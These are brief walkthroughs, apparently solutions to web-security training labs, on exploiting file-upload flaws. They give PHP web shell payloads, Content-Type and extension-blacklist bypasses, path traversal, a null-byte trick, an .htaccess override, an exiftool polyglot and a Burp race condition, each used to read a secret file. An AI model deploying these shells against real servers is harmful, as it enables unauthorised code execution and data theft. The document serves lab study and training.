# Lab: Remote code execution via web shell upload

Login -> Create a php file `<?php echo system($_GET['command']); ?>` -> Name it anything (e.g shell.php) -> Upload that file -> Go back to my-account -> Right click the image and view it in a new tab -> The url looks like [id]/files/avatars/shell.php -> get the answer: `files/avatars/shell.php?command=cat /home/carlos/secret`


# Lab: Web shell upload via Content-Type restriction bypass

Login -> Create a php file `<?php echo system($_GET['command']); ?>` -> Name it anything (e.g shell.php) -> Upload that file -> capture that request -> Change Content-type to image/png and also change the filename from shell.php to shell.png.php -> send -> see the response in browser, its uploaded -> follow previous method


# Lab: Web shell upload via path traversal

Login -> Create a php file `<?php echo system($_GET['command']); ?>` -> Name it anything (e.g shell.php) -> Upload that file -> capture that request -> Change the filename to `..%2fshell.php` -> send -> Its uploaded -> Now go back to my-account -> Right click the image and view it in a new tab -> In url change /files/avatars/..%2fshell.php to /files/avatars/../shell.php ->send -> now get the answer using `/files/avatars/../shell.php?command=cat /home/carlos/secret`

# Web shell upload via extension blacklist bypass

Login -> Upload a php file -> rejected -> capture that request -> In response see the Server: Apache/2.4.41 (Ubuntu) -> So change the filename=".htaccess", Content-Type: text/plain and add the content `AddType application/x-httpd-php .php5` -> Send -> Its been uplaoded -> Now again go back to Request and make filename="shell.php5", add the content `<?php echo file_get_contents('/home/carlos/secret'); ?>` -> send -> Go back to my-account -> Right click the image and view it in a new tab & get the answer


# Lab: Web shell upload via obfuscated file extension

Login -> Upload a php file `<?php echo file_get_contents('/home/carlos/secret'); ?>` -> Name it anything (e.g shell.php) -> Upload that file -> Rejected -> capture that request -> Change the filename to shell.php%00.jpg -> send again -> Accepted -> Go back to my-account -> Right click the image and view it in a new tab -> Change the url from /files/avatars/shell.php%00.jpg to /files/avatars/shell.php -> Enter and get the answer


# Lab: Remote code execution via polyglot web shell upload

First Download a jpg/png file from internet -> Then use: `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" example-original.jpg -o polyglot1.php` -> Now after login, upload that newly generated polyglot1.php file -> Its uploaded -> Now go back to my-account -> Right click the image and view it in a new tab


# Web shell upload via race condition

Login -> upload a valid jpg file -> Go back to my-account -> Right click the image and view it in a new tab -> capture that request
Then upload shell.php file and capture that request
Send both request in Burp Repeater -> For Image view request change from /files/avatar/[YOUR-IMAGE.jpg] to /files/avatar/shell.php -> Then Create a Group and add those two request in the same group (first shell.php request and then image view request) -> Duplicate the modified Viewing image request 8-10 times -> Then send in parallel -> One of the response will give the answer
